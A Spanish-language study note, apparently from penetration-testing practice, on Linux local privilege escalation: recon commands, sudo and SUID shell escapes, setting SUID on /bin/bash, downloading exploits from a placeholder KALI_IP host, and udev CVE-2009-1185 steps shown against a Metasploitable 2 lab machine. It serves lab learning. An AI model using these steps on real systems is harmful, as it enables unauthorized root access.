# Local Privilege Escalation (LPE)

## Descripción

La escalada de privilegios local es el proceso de **obtener permisos superiores a los que tienes actualmente** en un sistema al que ya tienes acceso. El objetivo habitual es pasar de un usuario de bajo privilegio (www-data, nobody) a **root**.

---

## Reconocimiento previo — Qué mirar siempre

Antes de intentar cualquier exploit, recaba información del sistema:

```shell
# Versión del sistema operativo y kernel
uname -a
cat /etc/os-release

# Usuario actual y grupos
id
whoami

# Qué puede ejecutar el usuario como sudo
sudo -l

# Binarios con bit SUID (se ejecutan como su propietario, normalmente root)
find / -perm -4000 -type f 2>/dev/null

# Procesos corriendo como root
ps aux | grep root

# Servicios activos
netstat -tlnp
ss -tlnp
```

---

## Vector 1 — Sudo sin contraseña

Si `sudo -l` muestra que puedes ejecutar algo como root sin contraseña:

```
(ALL) NOPASSWD: /usr/bin/vim
```

Puedes escalar con:
```shell
sudo vim -c ':!/bin/bash'
```

Consulta [GTFOBins](https://gtfobins.github.io) para ver cómo abusar de cualquier binario con sudo.

---

## Vector 2 — Binarios SUID

Los binarios con SUID se ejecutan con los permisos del propietario (normalmente root):

```shell
find / -perm -4000 -type f 2>/dev/null
```

Si encuentras binarios inusuales como `vim`, `find`, `nmap`, `python`, consulta GTFOBins.

Ejemplo con `find` SUID:
```shell
find . -exec /bin/bash -p \; -quit
```

### Activar SUID en bash manualmente (si tienes RCE como root o via exploit)

```shell
chmod +s /bin/bash
bash -p
whoami  # root
```

---

## Vector 3 — Kernel Exploit

Si el kernel es antiguo, puede ser vulnerable a exploits públicos.

### Identificar versión del kernel

```shell
uname -a
# Linux metasploitable 2.6.24-16-server
```

### Buscar exploits

```shell
searchsploit linux kernel 2.6.24
searchsploit udev 2.6
searchsploit vmsplice
```

### Proceso general para exploits de kernel en C

1. Copia el exploit a `/tmp` en Kali
2. Levanta servidor HTTP: `python3 -m http.server 8080`
3. Descárgalo en la víctima: `wget http://KALI_IP:8080/exploit.c`
4. Compila en la víctima: `gcc exploit.c -o exploit`
5. Ejecuta: `./exploit`

> **Importante:** Compila siempre en la **máquina víctima**, no en Kali. Los headers del kernel moderno de Kali son incompatibles con exploits para kernels antiguos.

---

## Vector 4 — udev CVE-2009-1185

**Versiones afectadas:** udev < 1.4.1 en Linux Kernel 2.6.x (Ubuntu 8.10/9.04)
**Referencia:** Exploit-DB 8572.c

udev no verifica el origen de los mensajes NETLINK, permitiendo a un usuario local enviar mensajes falsos que ejecutan comandos arbitrarios como root.

### Pasos

**1. Encontrar el PID del socket NETLINK de udevd:**

```shell
cat /proc/net/netlink   # Busca la línea con Eth=15 y Groups=00000001
ps aux | grep udev      # Confirma el PID del proceso udevd
# El socket NETLINK = PID del proceso udevd - 1
```

**2. Crear el payload en `/tmp/run`:**

```shell
echo '#!/bin/bash' > /tmp/run
echo 'chmod +s /bin/bash' >> /tmp/run
chmod +x /tmp/run
```

**3. Descargar y compilar el exploit:**

```shell
wget http://KALI_IP:8080/udev.c
gcc udev.c -o udev
```

**4. Ejecutar pasando el PID del socket NETLINK:**

```shell
./udev PID_NETLINK
```

**5. Verificar y escalar:**

```shell
ls -la /bin/bash         # Debe mostrar -rwsr-sr-x
bash -p
whoami                   # root
```

---

## Notas importantes

- `sudo -l` puede quedarse colgado en shells no interactivas. Si no responde, cancela con Ctrl+C y prueba otro vector.
- Los exploits de kernel pueden desestabilizar el sistema. Úsalos como último recurso.
- Después de escalar, ejecuta `id` para confirmar que tienes `euid=0(root)`.

---

## Ejemplo real — Máquina Metasploitable 2

Kernel 2.6.24 vulnerable a udev CVE-2009-1185. PID del socket NETLINK era 2578 (proceso udevd en PID 2579):

```shell
./udev 2578
ls -la /bin/bash
# -rwsr-sr-x 1 root root 701808 Apr 14  2008 /bin/bash
bash -p
# uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
```
